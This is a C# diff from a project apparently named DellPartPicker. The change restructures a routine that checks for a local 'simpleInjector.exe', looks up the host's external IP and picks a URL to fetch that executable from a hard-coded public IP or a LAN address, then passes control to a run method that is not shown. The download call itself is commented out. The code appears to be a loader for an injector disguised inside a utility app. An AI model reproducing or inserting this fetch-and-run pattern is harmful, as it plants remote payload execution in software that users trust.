@@ -18,30 +18,38 @@ namespace DellPartPicker
         {
             String url;
 
-            string externalip = new WebClient().DownloadString("http://icanhazip.com");
-
-            if (externalip.Equals(Constants.REMOTE_SERVER))
+            bool exists = File.Exists(@"C:\Temp\simpleInjector.exe");
+            if (exists)
             {
-                ip = Constants.LOCAL_SERVER;
-            }
-
-            if (ip == Constants.REMOTE_SERVER)
-            {
-                url = "http://73.17.34.121/hosted/simpleInjector.exe";
+                return run(message, ip);
             }
             else
             {
-                url = "http://10.0.0.4/hosted/simpleInjector.exe";
+                string externalip = new WebClient().DownloadString("http://icanhazip.com");
+
+                if (externalip.Equals(Constants.REMOTE_SERVER))
+                {
+                    ip = Constants.LOCAL_SERVER;
+                }
+
+                if (ip == Constants.REMOTE_SERVER)
+                {
+                    url = "http://73.17.34.121/hosted/simpleInjector.exe";
+                }
+                else
+                {
+                    url = "http://10.0.0.4/hosted/simpleInjector.exe";
+                }
+                return run(message, ip);
             }
+
+            
             //bool fetched = FetchItem.downloadFile(url, @"C:\Temp\simpleInjector.exe", false);
-            bool exists = File.Exists(@"C:\Temp\simpleInjector.exe");
+            
 
-            if (!exists)
-            {
-                return false;
-            }
+            
 
-            return run(message, ip);
+            
         }
 
         private static bool run(String message, String ip)
